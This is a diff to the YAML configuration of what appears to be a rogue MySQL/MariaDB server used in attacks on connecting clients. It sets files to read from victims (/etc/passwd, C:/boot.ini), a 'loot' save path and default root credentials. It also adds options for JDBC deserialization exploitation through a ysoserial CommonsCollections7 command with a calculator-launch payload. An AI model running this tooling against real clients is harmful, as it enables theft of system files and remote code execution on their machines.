@@ -1,10 +1,16 @@
 host: 0.0.0.0
 port: 3306
+version_string: "10.4.13-MariaDB-log"
+
 file_list: ["/etc/passwd", "C:/boot.ini"]
 save_path: ./loot
-auth: true
 always_read: false
-version_string: "10.4.13-MariaDB-log"
+
+auth: true
 users:
   - root: root
   - root: password
+
+jdbc_exploit: false
+always_exploit: false
+ysoserial_command: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections7", 'open -a Calculator']
